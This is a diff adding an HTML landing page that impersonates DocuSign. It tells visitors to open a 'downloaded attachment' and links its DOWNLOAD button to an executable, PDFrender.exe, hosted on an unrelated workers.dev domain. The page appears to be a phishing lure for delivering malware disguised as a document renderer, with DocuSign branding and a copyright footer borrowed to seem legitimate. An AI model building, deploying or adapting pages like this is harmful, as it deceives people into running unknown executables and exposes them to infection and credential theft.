@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Document Download</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+
+body{
+    font-family: Arial, Helvetica, sans-serif;
+    background:#ffffff;
+    margin:0;
+    padding:0;
+}
+
+.wrapper{
+    max-width:1100px;
+    margin:80px auto;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:60px;
+}
+
+.left img{
+    width:480px;
+    max-width:100%;
+}
+
+.right{
+    max-width:420px;
+}
+
+.logo{
+    font-size:18px;
+    font-weight:bold;
+    margin-bottom:30px;
+}
+
+.right h1{
+    font-size:34px;
+    line-height:1.3;
+    margin-bottom:30px;
+}
+
+.download-btn{
+    display:inline-block;
+    padding:16px 40px;
+    background:linear-gradient(90deg,#5f2eea,#6c63ff);
+    color:white;
+    font-weight:600;
+    text-decoration:none;
+    border-radius:6px;
+    letter-spacing:1px;
+}
+
+.download-btn:hover{
+    opacity:0.9;
+}
+
+.footer{
+    text-align:center;
+    margin-top:120px;
+    font-size:14px;
+    color:#666;
+}
+
+@media(max-width:900px){
+
+.wrapper{
+    flex-direction:column;
+    text-align:center;
+}
+
+.right{
+    max-width:600px;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+<div class="left">
+<img src="illustration.png" alt="">
+</div>
+
+<div class="right">
+
+<div class="logo">DocuSign</div>
+
+<h1>Open the downloaded attachment on your computer</h1>
+
+<a href="https://pdfrender.calm-leaf-88c1.workers.dev/PDFrender.exe" class="download-btn">DOWNLOAD</a>
+
+</div>
+
+</div>
+
+<div class="footer">
+© 2025 DocuSign All rights reserved.
+</div>
+
+</body>
+</html>
